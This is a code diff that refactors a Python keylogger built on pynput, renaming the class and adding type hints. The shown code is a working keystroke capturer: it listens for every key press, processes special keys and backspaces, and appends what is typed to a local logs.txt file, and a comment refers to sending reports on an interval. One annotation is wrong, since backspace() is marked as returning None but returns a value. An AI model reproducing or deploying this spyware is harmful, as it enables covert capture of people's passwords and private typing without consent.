@@ -2,8 +2,8 @@ import pynput
 from threading import Semaphore, Timer
 from pynput.keyboard import Key , Listener
 import sys
-class keylogger:
-    def __init__(self, interval):
+class KeyLogger:
+    def __init__(self, interval) -> None:
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         # this is the string variable that contains the log of all 
@@ -11,7 +11,7 @@ class keylogger:
         self.log = ""
         # for blocking after setting the on_release listener
         # self.semaphore = Semaphore(0)
-    def start(self):
+    def start(self) -> None:
         # start the keylogger
         with Listener(on_press=self.on_press) as listener:
             listener.join()
@@ -22,7 +22,7 @@ class keylogger:
         # if we don't block it, when we execute the program, nothing will happen
         # that is because on_release() will start the listener in a separate thread
         # self.semaphore.acquire()
-    def backspace (self,s):
+    def backspace (self,s) -> None:
         q = []  
   
         for i in range(0, len(s)):  
@@ -41,7 +41,7 @@ class keylogger:
   
     # return final string  
         return ans 
-    def on_press(self,key):
+    def on_press(self,key) -> None:
         name = str(key)
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
@@ -72,10 +72,10 @@ class keylogger:
                 # name = f"{name}"
                 self.write(name[1])
         # print(name,"log is written")
-    def write(self,name):
+    def write(self,name) -> None:
         with open("logs.txt","a") as f:
             f.write(name)
 
 if __name__ == "__main__":
-    keylogger = keylogger(600)
+    keylogger = KeyLogger(600)
     keylogger.start()
